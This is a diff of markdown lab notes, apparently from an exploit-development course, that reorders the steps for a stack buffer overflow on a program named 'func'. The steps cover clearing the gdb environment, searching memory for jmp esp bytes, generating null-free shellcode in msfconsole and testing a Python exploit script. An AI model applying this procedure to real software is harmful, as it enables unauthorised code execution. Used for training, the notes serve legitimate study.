@@ -26,17 +26,12 @@ ________________________________________________________________________________
 ### Open the gdb enviroment to unset the memory.
 #### Use the find command to locate the memory thats vulnerable to update your script.
     env - gdb func
-    show env
     unset env LINES
     unset env COLUMNS
+    show env
     run
     info proc map
     find /b 0xf7de2000 , 0xf7ffe000 , 0xff , 0xe4
-_____________________________________________________________________________________________________________________
-### Open gdb against the program func
-#### This is for testing the script continuously as you UPDATE IT.
-    gdb func
-    run <<< $(python test.py)
 _____________________________________________________________________________________________________________________
 ### Run msfconsole to get the shellcode to run the command in the script.
 #### step will take several attempts of running the last command and pasting into script.
@@ -46,6 +41,11 @@ ________________________________________________________________________________
     set CMD whoami
     show options
     generate -b "\x00" -f python                  #copy the output and place into python script may take a few tries.
+_____________________________________________________________________________________________________________________
+### Open gdb against the program func
+#### This is for testing the script continuously as you UPDATE IT.
+    gdb func
+    run <<< $(python test.py)
 _____________________________________________________________________________________________________________________
 # Scheme of Maneuver:
 ## >Jump Box
